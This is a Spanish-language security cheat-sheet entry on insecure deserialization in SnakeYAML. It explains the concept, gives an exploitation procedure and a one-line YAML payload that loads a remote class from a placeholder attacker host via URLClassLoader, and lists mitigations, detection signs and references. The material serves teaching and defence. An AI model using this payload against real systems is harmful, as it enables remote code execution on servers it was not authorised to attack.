---
topic: Deserialización insegura con SnakeYAML
tags: [web, java, yaml, snakeyaml, deserialization, rce]
---

# Deserialización insegura con SnakeYAML

[🇬🇧 English](snakeyaml-deserialization.en.md) | **Español**

## Concepto

`SnakeYAML` puede instanciar clases a partir de etiquetas `!!` en un documento YAML. Con el constructor por defecto, una entrada no confiable puede crear objetos y ejecutar código si el classpath ofrece un gadget adecuado.

## Cuándo aplica

- Importación de configuración YAML enviada por el usuario.
- `new Yaml().load(input)` sin `SafeConstructor`.
- Aplicaciones Java con dependencias que incluyen clases peligrosas.

## Procedimiento

1. Confirmar que el YAML se procesa y que los errores mencionan SnakeYAML.
2. Probar una etiqueta inocua como `!!java.util.Date`.
3. Enumerar clases disponibles en el classpath.
4. Construir un gadget con `URLClassLoader` o una clase con constructor peligroso.
5. Confirmar la ejecución con un callback HTTP/DNS.

```yaml
!!java.net.URLClassLoader [[!!java.net.URL ["http://<ATTACKER>/"]]]
```

## Variantes

- `ScriptEngineManager` para cargar un motor y ejecutar código.
- Clases con setters que escriben archivos.
- Cadenas de bibliotecas de terceros.

## Limitaciones

- `SafeConstructor` bloquea las etiquetas.
- El classpath puede no contener el gadget.
- Un sandbox o un filtro de clases impide la explotación.

## Mitigación

- Usar `SafeConstructor` y una lista de claves permitidas.
- No aceptar etiquetas ni tipos del usuario.
- Actualizar SnakeYAML y revisar dependencias.
- Ejecutar la importación con permisos mínimos.

## Detección

- Etiquetas `!!` en peticiones.
- Errores de clase o constructor.
- Conexiones salientes durante la importación.

## Referencias

- <https://bitbucket.org/snakeyaml/snakeyaml/wiki/Documentation>
- <https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data>
- <https://attack.mitre.org/techniques/T1059/007/>
